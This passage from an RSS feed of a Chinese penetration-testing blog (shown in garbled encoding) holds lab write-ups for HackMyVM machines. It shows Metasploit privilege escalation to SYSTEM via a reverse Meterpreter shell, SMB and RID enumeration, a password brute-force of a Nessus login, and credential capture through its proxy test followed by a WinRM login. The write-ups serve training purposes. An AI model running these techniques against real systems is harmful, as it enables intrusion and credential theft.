[*] Sending stage (176198 bytes) to 192.168.56.25
[*] Meterpreter session 1 opened (192.168.56.6:7788 -&gt; 192.168.56.25:54117) at 2024-12-24 08:10:03 -0500

meterpreter &gt;
<br>ç„¶ååˆ©ç”¨ local_exploit_suggester æ¨¡å— è¿›è¡Œæ£€æµ‹ææƒæ¼æ´<br>background å›åˆ°åå°
user post/multi/recon/local_exploit_suggester
set session 1
run

msf6 post(multi/recon/local_exploit_suggester) &gt; set session 1
session =&gt; 1
msf6 post(multi/recon/local_exploit_suggester) &gt; run

[*] fe80::c471:5b9c:b92e:7e8a - Collecting local exploits for x86/windows...
[*] fe80::c471:5b9c:b92e:7e8a - 193 exploit checks are being tried...
[+] fe80::c471:5b9c:b92e:7e8a - exploit/windows/local/always_install_elevated: The target is vulnerable.
[+] fe80::c471:5b9c:b92e:7e8a - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] fe80::c471:5b9c:b92e:7e8a - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
[+] fe80::c471:5b9c:b92e:7e8a - exploit/windows/local/ms10_092_schelevator: The service is running, but could not be validated.
[+] fe80::c471:5b9c:b92e:7e8a - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] fe80::c471:5b9c:b92e:7e8a - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] fe80::c471:5b9c:b92e:7e8a - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] fe80::c471:5b9c:b92e:7e8a - exploit/windows/local/tokenmagic: The target appears to be vulnerable.
[*] Running check method for exploit 41 / 41
[*] fe80::c471:5b9c:b92e:7e8a - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/always_install_elevated                  Yes                      The target is vulnerable.
 2   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
 4   exploit/windows/local/ms10_092_schelevator                     Yes                      The service is running, but could not be validated.
 5   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 6   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/ntusermndragover                         Yes                      The target appears to be vulnerable.
 8   exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.

<br>è¿™é‡Œæˆ‘ä»¬å°±ä½¿ç”¨æ¨èçš„ç¬¬ä¸€ä¸ªæ¨¡å— exploit/windows/local/always_install_elevated<br>msf6 exploit(windows/local/always_install_elevated) &gt; use exploit/windows/local/always_install_elevated
[*] Using configured payload windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/always_install_elevated) &gt; show options

Module options (exploit/windows/local/always_install_elevated):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.8.96     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows



View the full module info with the info, or info -d command.

msf6 exploit(windows/local/always_install_elevated) &gt; set lhost 192.168.56.6
lhost =&gt; 192.168.56.6
msf6 exploit(windows/local/always_install_elevated) &gt; set lport 7788
lport =&gt; 7788
msf6 exploit(windows/local/always_install_elevated) &gt; set session 1
session =&gt; 1
msf6 exploit(windows/local/always_install_elevated) &gt; run

[*] Started reverse TCP handler on 192.168.56.6:7788
[*] Uploading the MSI to C:\Users\ftpuser\AppData\Local\Temp\VEPgFpavVN.msi ...
[*] Executing MSI...
[*] Sending stage (176198 bytes) to 192.168.56.25
[+] Deleted C:\Users\ftpuser\AppData\Local\Temp\VEPgFpavVN.msi
[*] Meterpreter session 2 opened (192.168.56.6:7788 -&gt; 192.168.56.25:54480) at 2024-12-24 08:16:38 -0500

meterpreter &gt; shell
Process 1976 created.
Channel 2 created.
Microsoft Windows [Sâ–’râ–’m 6.1.7601]
Telif Hakkâ–’ (c) 2009 Microsoft Corporation. Tâ–’m haklarâ–’ saklâ–’dâ–’r.

C:\Windows\system32&gt;whoami
whoami
nt authority\system

<br>æœ€åæ˜¯flag<br>HMV{You_Found_Me!}
<br>HMV{White_Flag_Raised}
]]></description><link>https://www.c1trus.top/24-æ¸—é€/hmv/29.always.html</link><guid isPermaLink="false">24-æ¸—é€/HMV/29.Always.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241125224659.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241125224659.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[28.Troya]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br>é¶æœºé“¾æ¥ï¼šhttps://hackmyvm.eu/machines/machine.php?vm=Troya
<br>ä½œè€…ï¼šsml
<br>éš¾åº¦ï¼š
<br>
å‡ºä¸äº†ç½‘æ•´ä¸äº†
<br>ä¿¡æ¯æ”¶é›†<br>
çŸ¥è¯†ç‚¹ï¼š<br>
```Plain Text
nmap -sV 192.168.9.19  -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-15 19:02 CST
Nmap scan report for 192.168.9.19
Host is up (0.00025s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    nginx 1.14.2
MAC Address: 08:00:27:D0:C1:B2 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux\_kernel
<br>ç›®å½•æ‰«æ<br>æ‰«æå•¥éƒ½æ²¡æœ‰<br>ä¸»é¡µ<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/16.Troya.001.png" referrerpolicy="no-referrer"><br>æŠ“åŒ…çœ‹çœ‹]]></description><link>https://www.c1trus.top/24-æ¸—é€/hmv/28.troya.html</link><guid isPermaLink="false">24-æ¸—é€/HMV/28.Troya.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/16.Troya.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/16.Troya.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[27.Nessus]]></title><description><![CDATA[ 
 <br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a>
<br><a data-tooltip-position="top" aria-label="3. SMB ç©ºä¼šè¯æ£€æµ‹" data-href="#3. SMB ç©ºä¼šè¯æ£€æµ‹" href="https://www.c1trus.top/about:blank#3._SMB_ç©ºä¼šè¯æ£€æµ‹" class="internal-link" target="_self" rel="noopener nofollow">3. SMB ç©ºä¼šè¯æ£€æµ‹</a>

<br><a data-tooltip-position="top" aria-label="3.1. SMBcilent è¿æ¥" data-href="#3.1. SMBcilent è¿æ¥" href="https://www.c1trus.top/about:blank#3.1._SMBcilent_è¿æ¥" class="internal-link" target="_self" rel="noopener nofollow">3.1. SMBcilent è¿æ¥</a>
<br><a data-tooltip-position="top" aria-label="3.2. Nessus æŠ¥å‘Šæ£€æµ‹" data-href="#3.2. Nessus æŠ¥å‘Šæ£€æµ‹" href="https://www.c1trus.top/about:blank#3.2._Nessus_æŠ¥å‘Šæ£€æµ‹" class="internal-link" target="_self" rel="noopener nofollow">3.2. Nessus æŠ¥å‘Šæ£€æµ‹</a>


<br><a data-tooltip-position="top" aria-label="4. RID-bruteforce" data-href="#4. RID-bruteforce" href="https://www.c1trus.top/about:blank#4._RID-bruteforce" class="internal-link" target="_self" rel="noopener nofollow">4. RID-bruteforce</a>
<br><a data-tooltip-position="top" aria-label="5. æ£€æµ‹æŠ¥å‘Šåˆ©ç”¨" data-href="#5. æ£€æµ‹æŠ¥å‘Šåˆ©ç”¨" href="https://www.c1trus.top/about:blank#5._æ£€æµ‹æŠ¥å‘Šåˆ©ç”¨" class="internal-link" target="_self" rel="noopener nofollow">5. æ£€æµ‹æŠ¥å‘Šåˆ©ç”¨</a>
<br><a data-tooltip-position="top" aria-label="6. Nessus çˆ†ç ´" data-href="#6. Nessus çˆ†ç ´" href="https://www.c1trus.top/about:blank#6._Nessus_çˆ†ç ´" class="internal-link" target="_self" rel="noopener nofollow">6. Nessus çˆ†ç ´</a>

<br><a data-tooltip-position="top" aria-label="6.1. ä»£ç†è·å–å¯†ç " data-href="#6.1. ä»£ç†è·å–å¯†ç " href="https://www.c1trus.top/about:blank#6.1._ä»£ç†è·å–å¯†ç " class="internal-link" target="_self" rel="noopener nofollow">6.1. ä»£ç†è·å–å¯†ç </a>
<br><a data-tooltip-position="top" aria-label="6.2. winrmè¿æ¥" data-href="#6.2. winrmè¿æ¥" href="https://www.c1trus.top/about:blank#6.2._winrmè¿æ¥" class="internal-link" target="_self" rel="noopener nofollow">6.2. winrmè¿æ¥</a>


<br><a data-tooltip-position="top" aria-label="7. dllæ³¨å…¥" data-href="#7. dllæ³¨å…¥" href="https://www.c1trus.top/about:blank#7._dllæ³¨å…¥" class="internal-link" target="_self" rel="noopener nofollow">7. dllæ³¨å…¥</a>

<br><a data-tooltip-position="top" aria-label="7.1. ææƒæ£€æµ‹" data-href="#7.1. ææƒæ£€æµ‹" href="https://www.c1trus.top/about:blank#7.1._ææƒæ£€æµ‹" class="internal-link" target="_self" rel="noopener nofollow">7.1. ææƒæ£€æµ‹</a>
<br><a data-tooltip-position="top" aria-label="7.2. dllåˆ¶ä½œ" data-href="#7.2. dllåˆ¶ä½œ" href="https://www.c1trus.top/about:blank#7.2._dllåˆ¶ä½œ" class="internal-link" target="_self" rel="noopener nofollow">7.2. dllåˆ¶ä½œ</a>


<br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a>
<br><a data-tooltip-position="top" aria-label="3. SMB ç©ºä¼šè¯æ£€æµ‹" data-href="#3. SMB ç©ºä¼šè¯æ£€æµ‹" href="https://www.c1trus.top/about:blank#3._SMB_ç©ºä¼šè¯æ£€æµ‹" class="internal-link" target="_self" rel="noopener nofollow">3. SMB ç©ºä¼šè¯æ£€æµ‹</a>

<br><a data-tooltip-position="top" aria-label="3.1. SMBcilent è¿æ¥" data-href="#3.1. SMBcilent è¿æ¥" href="https://www.c1trus.top/about:blank#3.1._SMBcilent_è¿æ¥" class="internal-link" target="_self" rel="noopener nofollow">3.1. SMBcilent è¿æ¥</a>
<br><a data-tooltip-position="top" aria-label="3.2. Nessus æŠ¥å‘Šæ£€æµ‹" data-href="#3.2. Nessus æŠ¥å‘Šæ£€æµ‹" href="https://www.c1trus.top/about:blank#3.2._Nessus_æŠ¥å‘Šæ£€æµ‹" class="internal-link" target="_self" rel="noopener nofollow">3.2. Nessus æŠ¥å‘Šæ£€æµ‹</a>


<br><a data-tooltip-position="top" aria-label="4. RID-bruteforce" data-href="#4. RID-bruteforce" href="https://www.c1trus.top/about:blank#4._RID-bruteforce" class="internal-link" target="_self" rel="noopener nofollow">4. RID-bruteforce</a>
<br><a data-tooltip-position="top" aria-label="5. æ£€æµ‹æŠ¥å‘Šåˆ©ç”¨" data-href="#5. æ£€æµ‹æŠ¥å‘Šåˆ©ç”¨" href="https://www.c1trus.top/about:blank#5._æ£€æµ‹æŠ¥å‘Šåˆ©ç”¨" class="internal-link" target="_self" rel="noopener nofollow">5. æ£€æµ‹æŠ¥å‘Šåˆ©ç”¨</a>
<br><a data-tooltip-position="top" aria-label="6. Nessus çˆ†ç ´" data-href="#6. Nessus çˆ†ç ´" href="https://www.c1trus.top/about:blank#6._Nessus_çˆ†ç ´" class="internal-link" target="_self" rel="noopener nofollow">6. Nessus çˆ†ç ´</a>

<br><a data-tooltip-position="top" aria-label="6.1. ä»£ç†è·å–å¯†ç " data-href="#6.1. ä»£ç†è·å–å¯†ç " href="https://www.c1trus.top/about:blank#6.1._ä»£ç†è·å–å¯†ç " class="internal-link" target="_self" rel="noopener nofollow">6.1. ä»£ç†è·å–å¯†ç </a>
<br><a data-tooltip-position="top" aria-label="6.2. winrmè¿æ¥" data-href="#6.2. winrmè¿æ¥" href="https://www.c1trus.top/about:blank#6.2._winrmè¿æ¥" class="internal-link" target="_self" rel="noopener nofollow">6.2. winrmè¿æ¥</a>


<br><a data-tooltip-position="top" aria-label="7. dllæ³¨å…¥" data-href="#7. dllæ³¨å…¥" href="https://www.c1trus.top/about:blank#7._dllæ³¨å…¥" class="internal-link" target="_self" rel="noopener nofollow">7. dllæ³¨å…¥</a><br>
- <a data-tooltip-position="top" aria-label="7.1. ææƒæ£€æµ‹" data-href="#7.1. ææƒæ£€æµ‹" href="https://www.c1trus.top/about:blank#7.1._ææƒæ£€æµ‹" class="internal-link" target="_self" rel="noopener nofollow">7.1. ææƒæ£€æµ‹</a><br>
- <a data-tooltip-position="top" aria-label="7.2. dllåˆ¶ä½œ" data-href="#7.2. dllåˆ¶ä½œ" href="https://www.c1trus.top/about:blank#7.2._dllåˆ¶ä½œ" class="internal-link" target="_self" rel="noopener nofollow">7.2. dllåˆ¶ä½œ</a><br>
é¶æœºé“¾æ¥ <a rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/machines/machine.php?vm=Nessus" target="_blank">https://hackmyvm.eu/machines/machine.php?vm=Nessus</a><br>
ä½œè€… <a data-tooltip-position="top" aria-label="https://hackmyvm.eu/profile/?user=josemlwdf" rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/profile/?user=josemlwdf" target="_blank">josemlwdf</a><br>
éš¾åº¦ â­ï¸â­ï¸â­ï¸â­ï¸
<br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Nessus]
â””â”€# fping -aqg 192.168.56.0/24
192.168.56.2
192.168.56.6
192.168.56.156

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Nessus]
â””â”€# fscan -h 192.168.56.156

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
192.168.56.156:445 open
192.168.56.156:139 open
192.168.56.156:135 open
192.168.56.156:8834 open
[*] alive ports len is: 4
start vulscan
[*] NetBios 192.168.56.156  WORKGROUP\NESSUS
[*] NetInfo
[*]192.168.56.156
   [-&gt;]Nessus
   [-&gt;]192.168.56.156
[*] WebTitle https://192.168.56.156:8834 code:200 len:1217   title:Nessus
å·²å®Œæˆ 4/4

<br>å¼€äº†ä¸€ä¸ªç½‘é¡µã€‚å°è¯•è®¿é—® <a rel="noopener nofollow" class="external-link" href="https://192.168.56.156:8834" target="_blank">https://192.168.56.156:8834</a><img alt="jbolsp8toi" src="https://www.c1trus.top/24-æ¸—é€/hmv/assets/kxrxpqqr598.png"><br>
è¿™å°±æ˜¯ Nessus<br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Nessus]
â””â”€# smbmap -u anonymous -H 192.168.56.156

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)

[+] IP: 192.168.56.156:445      Name: 192.168.56.156            Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        Documents                                               READ, WRITE
        IPC$                                                    READ ONLY       Remote IPC

<br>å‘ç°ä¸¤ä¸ªå…±äº«çš„ç›®å½•å…¶ä¸­ä¸€ä¸ªè¿˜æœ‰å†™æƒé™<br>
Documents IPC$ <br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Nessus]
â””â”€# smbclient -U 'anonymous' //192.168.56.156/IPC$
Password for [WORKGROUP\anonymous]:
Try "help" to get a list of possible commands.
smb: \&gt; ls
NT_STATUS_NO_SUCH_FILE listing \*
smb: \&gt; exit

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Nessus]
â””â”€# smbclient -U 'anonymous' //192.168.56.156/Documents
Password for [WORKGROUP\anonymous]:
Try "help" to get a list of possible commands.
smb: \&gt; ls
  .                                  DR        0  Sun Nov 24 14:01:18 2024
  ..                                  D        0  Sat Oct 19 13:08:23 2024
  desktop.ini                       AHS      402  Sun Jun 16 01:54:33 2024
  My Basic Network Scan_hwhm7q.pdf      A   122006  Sat Oct 19 06:19:59 2024
  My Music                        DHSrn        0  Sun Jun 16 01:54:27 2024
  My Pictures                     DHSrn        0  Sun Jun 16 01:54:27 2024
  My Videos                       DHSrn        0  Sun Jun 16 01:54:27 2024
  Web Application Tests_f6jg9t.pdf      A   136025  Sat Oct 19 06:20:14 2024

                12942591 blocks of size 4096. 10637803 blocks available

smb: \&gt; get "My Basic Network Scan_hwhm7q.pdf"
getting file \My Basic Network Scan_hwhm7q.pdf of size 122006 as My Basic Network Scan_hwhm7q.pdf (6619.2 KiloBytes/sec) (average 6619.2 KiloBytes/sec)
smb: \&gt; get "Web Application Tests_f6jg9t.pdf"
getting file \Web Application Tests_f6jg9t.pdf of size 136025 as Web Application Tests_f6jg9t.pdf (7813.9 KiloBytes/sec) (average 7199.5 KiloBytes/sec)

<br>
è¿™é‡Œæ–‡ä»¶éƒ½æ˜¯æœ‰ç©ºæ ¼çš„ã€‚è¯»å–çš„æ—¶å€™è®°å¾—åŠ ä¸ŠåŒå¼•å·åŒ…èµ·æ¥
<br><br>ä¸‹è½½çš„ä¸¤ä¸ª pdf æ–‡ä»¶é‡Œé¢æ˜¯ Nessus çš„æ£€æµ‹æŠ¥å‘Šï¼Œ<br><img alt="2pptmtbbfyw" src="https://www.c1trus.top/24-æ¸—é€/hmv/assets/l70fhfkoz6.png"><br><img alt="ubj32k2rds" src="https://www.c1trus.top/24-æ¸—é€/hmv/assets/ouekbtxpf4p.png"><br>
è¿™é‡Œçœ‹ç€æœ‰ä¸€å¤§å †æ´ã€‚ä½†æˆ‘å…ˆä¸è€ƒè™‘å»åˆ©ç”¨ä»–ï¼Œå› ä¸ºæˆ‘ä¸ä¼š<br><br>é¶æœºå¼€æ”¾äº† 135ï¼ˆRPC æœåŠ¡ï¼‰ä¸ 445(SMB æœåŠ¡) è€Œä¸”è¿˜å…è®¸ SMB åŒ¿åè®¿é—®<br>
é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œ RID æšä¸¾çˆ†ç ´å‡ºåŸŸå†…ç”¨æˆ·ä¿¡æ¯<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Nessus]
â””â”€# crackmapexec smb 192.168.56.156 -u 'anonymous' -p '' --rid-brute &gt; rid_bruteforce.txt

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Nessus]
â””â”€# cat rid_bruteforce.txt | grep 'SidTypeUser' | cut -d '\' -f2 | cut -d ' ' -f1 &gt; domain_users.txt

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Nessus]
â””â”€# cat domain_users.txt
Administrator
Guest
DefaultAccount
WDAGUtilityAccount
nesus

<br>å¯ä»¥å‘ç°ä¸»æœºæœ‰ä¸€ä¸ª nesus ç”¨æˆ·<br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Nessus]
â””â”€# exiftool My\ Basic\ Network\ Scan_hwhm7q.pdf
ExifTool Version Number         : 12.76
File Name                       : My Basic Network Scan_hwhm7q.pdf
Directory                       : .
File Size                       : 122 kB
File Modification Date/Time     : 2024:11:24 13:09:43+08:00
File Access Date/Time           : 2024:11:24 13:16:35+08:00
File Inode Change Date/Time     : 2024:11:24 13:09:43+08:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
Linearized                      : No
Page Count                      : 5
Profile CMM Type                : Little CMS
Profile Version                 : 2.3.0
Profile Class                   : Display Device Profile
Color Space Data                : RGB
Profile Connection Space        : XYZ
Profile Date Time               : 2004:08:13 12:18:06
Profile File Signature          : acsp
Primary Platform                : Microsoft Corporation
CMM Flags                       : Not Embedded, Independent
Device Manufacturer             : Little CMS
Device Model                    :
Device Attributes               : Reflective, Glossy, Positive, Color
Rendering Intent                : Perceptual
Connection Space Illuminant     : 0.9642 1 0.82491
Profile Creator                 : Little CMS
Profile ID                      : 7fb30d688bf82d32a0e748daf3dba95d
Device Mfg Desc                 : lcms generated
Profile Description             : sRGB
Device Model Desc               : sRGB
Media White Point               : 0.95015 1 1.08826
Red Matrix Column               : 0.43585 0.22238 0.01392
Blue Matrix Column              : 0.14302 0.06059 0.71384
Green Matrix Column             : 0.38533 0.71704 0.09714
Red Tone Reproduction Curve     : (Binary data 2060 bytes, use -b option to extract)
Green Tone Reproduction Curve   : (Binary data 2060 bytes, use -b option to extract)
Blue Tone Reproduction Curve    : (Binary data 2060 bytes, use -b option to extract)
Chromaticity Channels           : 3
Chromaticity Colorant           : Unknown
Chromaticity Channel 1          : 0.64 0.33
Chromaticity Channel 2          : 0.3 0.60001
Chromaticity Channel 3          : 0.14999 0.06
Profile Copyright               : no copyright, use freely
XMP Toolkit                     : Image::ExifTool 12.76
Date                            : 2024:10:18 15:10:05+02:00
Format                          : application/pdf
Language                        : x-unknown
Author                          : Jose
PDF Version                     : 1.4
Producer                        : Apache FOP Version 2.8
Create Date                     : 2024:10:18 15:10:05+02:00
Creator Tool                    : Apache FOP Version 2.8
Metadata Date                   : 2024:10:18 15:10:05+02:00
Page Mode                       : UseOutlines
Creator                         : Apache FOP Version 2.8

<br>è¿™é‡Œè·å–åˆ°äº†ä½œè€…æ˜¯ Jose<br>
è¿™å¯èƒ½æ˜¯ nessus çš„ç”¨æˆ·å› ä¸ºä»–ä¸åœ¨ç³»ç»Ÿç”¨æˆ·å½“ä¸­<br><br>æŠ“åŒ…ç”¨ jose ä½œä¸ºç”¨æˆ·åè¿›è¡Œçˆ†ç ´<br>POST sessio/n HTTP/1.1
Host: 192.168.56.156:8834
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/json
X-API-Token: b5c724c0-00ce-4710-9794-59362a41137f
Content-Length: 39
Origin: https://192.168.56.156:8834
Connection: keep-alive
Referer: https://192.168.56.156:8834/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
{"username":"jose","password":"123456"}

<br>ffuf çˆ†ç ´<br>ffuf -X POST -u 'https://192.168.56.156:8834/session' -d {"username":"jose","password":"FUZZ"}' -w /usr/share/wordlists/rockyou.txt
<br><img alt="09ibvzgi2q1g" src="https://www.c1trus.top/24-æ¸—é€/hmv/assets/7uartc0kko.png"><br>
æˆåŠŸçˆ†ç ´å‡ºå¯†ç æ˜¯tequiero
ç™»å½•åå°åœ¨ ProxyServer è¿™é‡Œå¯ä»¥çœ‹åˆ°å¯†ç <br><img alt="2v10epcykxi" src="https://www.c1trus.top/24-æ¸—é€/hmv/assets/i38aqp1tptp.png"><br>
f12 çœ‹ä¸€ä¸‹å¯†ç 
å‘ç°å¯†ç æ˜¯ ``<br><img alt="w03pzu93u49" src="https://www.c1trus.top/24-æ¸—é€/hmv/assets/4h5viy4mmst.png"><br><br>æˆ‘ä»¬ä¿®æ”¹è¿™ä¸ªHost ä¸ ip  æ”¹æˆæˆ‘ä»¬kaliçš„ã€‚
å¹¶ä¿®æ”¹ Auth Method æ”¹æˆ BASIC <img alt="t0dk9ozjfrn" src="https://www.c1trus.top/24-æ¸—é€/hmv/assets/3do4cjbbfht.png"><br>
ç„¶åkaliç›‘å¬ï¼Œåœ¨ç‚¹å‡» Test Proxy Server è¿™æ ·å¯ä»¥è·å–åˆ°å¯†ç <br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Nessus]
â””â”€# nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.56.6] from (UNKNOWN) [192.168.56.156] 49758
CONNECT plugins.nessus.org:443 HTTP/1.1
Proxy-Authorization: Basic bmVzdXM6WiNKdVhIJHBoLTt2QCxYJm1WKQ==
Host: plugins.nessus.org
Connection: keep-Alive
User-Agent: Nessus/10.7.3
Content-Length: 0
Proxy-Connection: Keep-Alive

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Nessus]
â””â”€# echo 'bmVzdXM6WiNKdVhIJHBoLTt2QCxYJm1WKQ==' |base64 -d
nesus:Z#JuXH$ph-;v@,X&amp;mV)                

<br><br>è·å–åˆ° nesus ç”¨æˆ·çš„å¯†ç  Z#JuXH$ph-;v@,X&amp;mV)<br>ä¹‹å‰è¿›è¡Œ rid-brute æ—¶å¯ä»¥å‘ç° nesus æ˜¯ç³»ç»Ÿçš„ä¸€ä¸ªç”¨æˆ·<br>
æˆ‘ä»¬å°è¯•åˆ©ç”¨è¿™ä¸ªç”¨æˆ·è¿›è¡Œ winrm è¿æ¥<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Nessus]
â””â”€# evil-winrm -i 192.168.56.156 -u nesus -p 'Z#JuXH$ph-;v@,X&amp;mV)'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\nesus\Documents&gt;

<br>æˆåŠŸè¿æ¥<br><br>çœ‹ä¸‹å½“å‰ç”¨æˆ·çš„æƒé™<br>*Evil-WinRM* PS C:\Users\nesus&gt; whoami /all

USER INFORMATION
----------------

User Name    SID
============ ============================================
nessus\nesus S-1-5-21-2986980474-46765180-2505414164-1001


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users        Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                   Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
